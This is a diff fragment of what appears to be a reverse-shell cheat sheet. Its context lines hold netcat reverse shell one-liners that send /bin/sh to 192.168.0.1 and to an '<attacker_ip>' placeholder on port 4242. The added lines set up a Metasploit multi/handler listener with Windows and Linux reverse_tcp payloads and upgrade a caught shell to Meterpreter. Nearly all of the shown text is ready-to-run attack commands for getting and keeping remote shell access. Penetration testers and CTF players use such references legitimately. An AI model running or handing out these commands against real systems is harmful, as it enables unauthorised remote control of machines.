@@ -39,9 +39,29 @@ nc -e /bin/sh 192.168.0.1 4242
 $mknod /tmp/backpipe p
 $/bin/sh 0</tmp/backpipe | nc <attacker_ip> 4242 1>/tmp/backpipe
 ```
-
++ <b>Metasploit - Listener</b>
+```
+msfconsole
+use exploit/multi/handler
+set PAYLOAD /windows/shell/reverse_tcp
+OR
+set PAYLOAD /linux/x64/shell/reverse_tcp
+set LHOST 192.168.0.1
+set LPORT 4242
+run
+```
 
 ## Upgrading/Stablizing Shells:
+
++ <b>Shell To Meterpreter</b>
+```
+(After shell has been backgrounded in Metasploit)
+use post/multi/manage/shell_to_meterpreter
+set SESSION 1
+run
+OR
+sessions -u 1
+```
 
 + <b>Using Python</b>
 
